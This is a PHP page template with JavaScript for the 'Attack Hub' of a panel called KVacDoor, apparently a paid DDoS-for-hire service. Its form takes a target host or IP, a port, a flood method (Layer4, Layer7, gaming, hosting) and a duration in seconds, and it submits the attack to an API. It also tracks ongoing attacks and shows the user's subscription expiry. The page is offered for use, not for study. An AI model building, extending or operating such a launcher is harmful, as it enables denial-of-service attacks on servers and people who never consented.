<?php

function time_to_hours($Time)
{
    if ($Time < 3600) {
        $heures = 0;

        if ($Time < 60) {
            $minutes = 0;
        } else {
            $minutes = round($Time / 60);
        }
        $secondes = floor($Time % 60);
    } else {
        $heures = round($Time / 3600);
        $secondes = round($Time % 3600);
        $minutes = floor($secondes / 60);
    }

    $secondes2 = round($secondes % 60);

    $TimeFinal = "$heures h $minutes min $secondes2 s";
    return $TimeFinal;
}

?><div class="row">
    <div class="col-12">
        <div class="page-title-box d-flex align-items-center justify-content-between">
            <h4 class="mb-0 font-size-18"><i class="fa fa-wifi"></i> <?= $title ?></h4>

            <div class="page-title-right">
                <ol class="breadcrumb m-0">
                    <li class="breadcrumb-item"><a href="/overview">KVacDoor</a></li>
                    <li class="breadcrumb-item active"><?= $title ?></li>
                </ol>
            </div>
        </div>
    </div>
</div>

<div class="row">
    <div class="col-lg-12">
        <div class="alert alert-info">Your network access subscription will expire in <?= time_to_hours(strtotime($AUTHUSER['network_expire']) - time()) ?></div>
    </div>
</div>

<div class="row">
    <div class="col-lg-5">
        <div class="card">
            <div class="card-body">
                <h4 class="card-title"><i class="fa fa-cog" aria-hidden="true"></i> Attack Hub</h4>

                <form>
                    <div class="form-group">
                        <label for="hostInput">Host/IP</label>
                        <input type="text" class="form-control" id="hostInput" aria-describedby="hostHelp" placeholder="127.0.0.1">
                        <small id="hostHelp" class="form-text text-muted">Enter a web address or an ip</small>
                    </div>
                    <div class="form-group">
                        <label for="portInput">Port</label>
                        <input type="text" class="form-control" id="portInput" placeholder="80">
                        <small class="form-text text-muted">Put the value 80 if you are not sure</small>
                    </div>

                    <div class="form-group">
                        <label for="exampleFormControlSelect1">Method</label>
                        <select class="form-control" id="exampleFormControlSelect1">
                            <optgroup label="Layer4">
                            <?php foreach($protocols['layer4'] as $protocol): ?>
                            <option name="<?= $protocol ?>"><?= $protocol ?></option>
                            <?php endforeach; ?>
                            </optgroup>
                            <optgroup label="Layer7">
                            <?php foreach($protocols['layer7'] as $protocol): ?>
                            <option name="<?= $protocol ?>"><?= $protocol ?></option>
                            <?php endforeach; ?>
                            </optgroup>
                            <optgroup label="Gaming">
                            <?php foreach($protocols['gaming'] as $protocol): ?>
                            <option name="<?= $protocol ?>"><?= $protocol ?></option>
                            <?php endforeach; ?>
                            <optgroup label="Hosting">
                            <?php foreach($protocols['hosting'] as $protocol): ?>
                            <option name="<?= $protocol ?>"><?= $protocol ?></option>
                            <?php endforeach; ?>
                            </optgroup>
                        </select>
                    </div>

                    <div class="form-group">
                        <label for="timeInput">Time</label>
                        <input type="number" class="form-control" id="timeInput" placeholder="45">
                        <small class="form-text text-muted">Please enter the time in seconds</small>
                    </div>
                    <button type="submit" class="btn btn-primary btn-block"><i class="fa fa-rocket" aria-hidden="true"></i> Launch</button>
                </form>

            </div>
        </div>
    </div>

    <div class="col-lg-7">
        <div class="card">
            <div class="card-body">
                <h4 class="card-title"><i class="fa fa-address-book" aria-hidden="true"></i> Ongoing Attack</h4>
                <div class="table-responsive">
                <table class="table">
                    <thead>
                        <tr>
                            <th scope="col">#</th>
                            <th scope="col">Host/IP</th>
                            <th scope="col">Port</th>
                            <th scope="col">Method</th>
                            <th scope="col">Time</th>
                            <th scope="col">Status</th>
                            <th scope="col">Action</th>
                        </tr>
                    </thead>
                    <tbody id="downlist">
                        
                    </tbody>
                </table>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
// Get form element
const form = document.querySelector("form");

// Handle form submit event
form.addEventListener("submit", (event) => {
    event.preventDefault();

    // Get form values
    const host = document.querySelector("#hostInput").value;
    const port = document.querySelector("#portInput").value;
    const method = document.querySelector("#exampleFormControlSelect1").value;
    const time = document.querySelector("#timeInput").value;

    // Create data object
    const data = { host, port, method, time };

    // Send POST request to API endpoint
    fetch("/api/network", {
        method: "POST",
        body: JSON.stringify(data),
        headers: { "Content-Type": "application/json" },
    })
        .then((response) => response.json())
        .then((data) => {
            console.log(data);

            if (data.success) {
                Swal.fire({
                    'title': 'Success',
                    'text': 'Attack sent successfully!',
                    'type': 'success',
                    'timer': 0x3e8
                });
            } else {
                Swal.fire({
                    'type': 'error',
                    'title': 'Oops...',
                    'text': data.message
                });
            }

        })
        .catch((error) => {
            console.error("Error:", error);

            Swal.fire({
                'type': 'error',
                'title': 'Oops...',
                'text': 'An error has occurred',
                'timer': 0x5dc
            });
        });
});

function stopAttack(id) {
    fetch("/api/network", {
        method: "DELETE",
        body: JSON.stringify({ id: id })
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error(error))
}

function escapeHtml(content)
{
    var map = 
    {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return content.toString().replace(/[&<>"']/g, function(m) { return map[m]; });
}

// Récupération des données JSON à partir de l'API
function getServer()
{
    $.ajax({
        method: "GET",
        url: "/api/network",
        timeout: 2000,
    }).done(function(data){
        $('#downlist').empty();
        $.each(data, function (index, attack) {
            index++;
            console.log(attack);
            $('#downlist').append('<tr><th scope="row">' + index + '</th><td>' + escapeHtml(attack.host) + '</td><td>' + escapeHtml(attack.port) + '</td><td>' + escapeHtml(attack.method) + '</td><td class="time-remaining">' + escapeHtml(attack.remaining) + '</td><td><span class="badge badge-success">Ongoing</span></td><td><button class="btn btn-danger btn-sm" onclick="stopAttack('+ attack.id +')"><i class="fa fa-power-off" aria-hidden="true"></i> Stop</button></td></tr>');
        });
    });
}

setInterval(() => {
    const elements = document.querySelectorAll('.time-remaining');
    elements.forEach((element) => {
        element.innerHTML = parseInt(element.innerHTML) - 1;
    });
}, 1000);

getServer();

setInterval(getServer, 5000);
</script>
